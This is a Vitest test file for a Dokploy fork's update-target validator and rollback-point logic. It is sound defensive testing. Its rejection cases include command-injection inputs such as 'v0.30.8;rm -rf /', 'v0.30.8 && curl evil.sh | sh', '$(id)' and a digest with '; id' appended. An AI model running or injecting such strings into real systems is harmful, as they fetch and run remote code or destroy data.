import {
	existsSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
	DOKPLOY_IMAGE_REPO,
	isDokployUpdateTarget,
	resolveDokployUpdateImage,
} from "@dokploy/server/utils/dokploy-update-target";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
	execAsync: vi.fn(),
}));

vi.mock("@dokploy/server/db", () => ({
	db: { query: {} },
}));

vi.mock("@dokploy/server/utils/process/execAsync", async (importOriginal) => ({
	...(await importOriginal<
		typeof import("@dokploy/server/utils/process/execAsync")
	>()),
	execAsync: mocks.execAsync,
}));

const { readDokployRollbackPoint, recordDokployRollbackPoint } = await import(
	"@dokploy/server/services/settings"
);

const HEX = "0123456789abcdef".repeat(4);
const DIGEST = `sha256:${HEX}`;
const REPO = "ghcr.io/devinosolutions/dokploy-community";

describe("pinned update targets", () => {
	it.each([
		"v0.30.8",
		"v0.30.8-community.32",
		"v0.30.8-community.32.1",
		"v10.20.30-community.400.5",
		DIGEST,
	])("accepts %j", (target) => {
		expect(isDokployUpdateTarget(target)).toBe(true);
	});

	it.each([
		// not a release tag
		"",
		"latest",
		"canary",
		"feature",
		"0.30.8",
		"V0.30.8",
		"v0.30",
		"v0.30.8-community",
		"v0.30.8-community.",
		"v0.30.8-community.32.1.2",
		"v0.30.8-rc.1",
		"v0.30.8+build",
		"v０.30.8",
		// whitespace and shell syntax
		" v0.30.8",
		"v0.30.8 ",
		"v0.30.8\n",
		"v0.30.8\r",
		"v0.30.8\t",
		"v0.30.8\nid",
		"v0.30.8;",
		"v0.30.8; id",
		"v0.30.8;rm -rf /",
		"v0.30.8 && curl evil.sh | sh",
		"v0.30.8|sh",
		"v0.30.8`id`",
		"$(id)",
		"${IFS}",
		"'v0.30.8'",
		'"v0.30.8"',
		"v0.30.8\u0000",
		"--help",
		"-v",
		"../v0.30.8",
		// other repos, or the repo spelled out by the caller
		"ghcr.io/evil/dokploy-community:v0.30.8",
		"dokploy/dokploy:v0.30.8",
		"docker.io/library/alpine:latest",
		`${REPO}:v0.30.8`,
		`${REPO}@${DIGEST}`,
		`evil.io/x@${DIGEST}`,
		`v0.30.8@${DIGEST}`,
		// malformed digests
		"sha256:",
		`sha256:${HEX.slice(1)}`,
		`sha256:${HEX}0`,
		`sha256:${HEX.toUpperCase()}`,
		`sha512:${HEX}`,
		`SHA256:${HEX}`,
		`sha256:${HEX.slice(1)}g`,
		`${DIGEST}\n`,
		`${DIGEST} --detach`,
		` ${DIGEST}`,
	])("rejects %j", (target) => {
		expect(isDokployUpdateTarget(target)).toBe(false);
		expect(resolveDokployUpdateImage(target)).toBeNull();
	});

	it("pins a tag and a digest inside the fork repo", () => {
		expect(DOKPLOY_IMAGE_REPO).toBe(REPO);
		expect(resolveDokployUpdateImage("v0.30.8-community.32.1")).toBe(
			`${REPO}:v0.30.8-community.32.1`,
		);
		expect(resolveDokployUpdateImage(DIGEST)).toBe(`${REPO}@${DIGEST}`);
	});
});

describe("Dokploy rollback point", () => {
	let dir: string;
	let file: string;

	const spec = (image: string, state = "") => {
		mocks.execAsync.mockResolvedValue({
			stdout: `${image} ${state}\n`,
			stderr: "",
		});
	};

	beforeEach(() => {
		vi.clearAllMocks();
		dir = mkdtempSync(join(tmpdir(), "t7529-rollback-"));
		file = join(dir, "dokploy-update-rollback.json");
	});

	afterEach(() => {
		rmSync(dir, { recursive: true, force: true });
	});

	it("records the version and digest of the running service image", async () => {
		spec(`${REPO}:v0.30.8-community.31@${DIGEST}`, "completed");

		await recordDokployRollbackPoint("v0.30.8-community.31", file);

		expect(mocks.execAsync).toHaveBeenCalledWith(
			"docker service inspect dokploy --format '{{.Spec.TaskTemplate.ContainerSpec.Image}} {{if .UpdateStatus}}{{.UpdateStatus.State}}{{end}}'",
		);
		expect(JSON.parse(readFileSync(file, "utf8"))).toEqual({
			version: "v0.30.8-community.31",
			digest: DIGEST,
		});
		await expect(
			readDokployRollbackPoint("v0.30.8-community.32", file),
		).resolves.toEqual({ version: "v0.30.8-community.31", digest: DIGEST });
	});

	it("records an image without a tag, or with the latest tag", async () => {
		spec(`${REPO}@${DIGEST}`);
		await recordDokployRollbackPoint("v0.30.8-community.31", file);
		expect(JSON.parse(readFileSync(file, "utf8")).digest).toBe(DIGEST);

		spec(`${REPO}:latest@${DIGEST}`);
		await recordDokployRollbackPoint("v0.30.8-community.30", file);
		expect(JSON.parse(readFileSync(file, "utf8")).version).toBe(
			"v0.30.8-community.30",
		);
	});

	it("offers no rollback to the version that is running", async () => {
		spec(`${REPO}:v0.30.8-community.32@${DIGEST}`);
		await recordDokployRollbackPoint("v0.30.8-community.32", file);

		await expect(
			readDokployRollbackPoint("v0.30.8-community.32", file),
		).resolves.toBeNull();
	});

	it.each([
		["no digest", `${REPO}:v0.30.8-community.31`],
		["another repo", `ghcr.io/evil/dokploy-community:v0.30.8@${DIGEST}`],
		["upstream", `dokploy/dokploy:v0.30.8@${DIGEST}`],
		["a tag naming another version", `${REPO}:v0.30.8-community.33@${DIGEST}`],
		["an empty spec", ""],
	])("drops the old point when the spec has %s", async (_name, image) => {
		writeFileSync(
			file,
			JSON.stringify({ version: "v0.30.8-community.20", digest: DIGEST }),
		);
		spec(image);

		await recordDokployRollbackPoint("v0.30.8-community.31", file);

		expect(existsSync(file)).toBe(false);
		await expect(
			readDokployRollbackPoint("v0.30.8-community.31", file),
		).resolves.toBeNull();
	});

	it.each(["updating", "paused", "rollback_started", "rollback_paused"])(
		"keeps the point of the update in flight while the service is %s",
		async (state) => {
			const point = { version: "v0.30.8-community.30", digest: DIGEST };
			writeFileSync(file, JSON.stringify(point));
			spec(`${REPO}:v0.30.8-community.31@sha256:${"f".repeat(64)}`, state);

			await recordDokployRollbackPoint("v0.30.8-community.30", file);

			expect(JSON.parse(readFileSync(file, "utf8"))).toEqual(point);
		},
	);

	it("never throws, and drops the old point, when docker fails", async () => {
		writeFileSync(
			file,
			JSON.stringify({ version: "v0.30.8-community.20", digest: DIGEST }),
		);
		mocks.execAsync.mockRejectedValue(new Error("Cannot connect to docker"));
		const error = vi.spyOn(console, "error").mockImplementation(() => {});

		await expect(
			recordDokployRollbackPoint("v0.30.8-community.31", file),
		).resolves.toBeUndefined();

		expect(existsSync(file)).toBe(false);
		error.mockRestore();
	});

	it.each([
		["a missing file", null],
		["broken JSON", "{"],
		["null", "null"],
		[
			"a digest with shell syntax",
			JSON.stringify({ version: "v0.30.8", digest: `${DIGEST}; id` }),
		],
		[
			"a version that is not a release",
			JSON.stringify({ version: "latest", digest: DIGEST }),
		],
		["missing fields", JSON.stringify({ digest: DIGEST })],
	])("offers no rollback for %s", async (_name, content) => {
		if (content !== null) {
			writeFileSync(file, content);
		}

		await expect(
			readDokployRollbackPoint("v0.30.8-community.32", file),
		).resolves.toBeNull();
	});
});
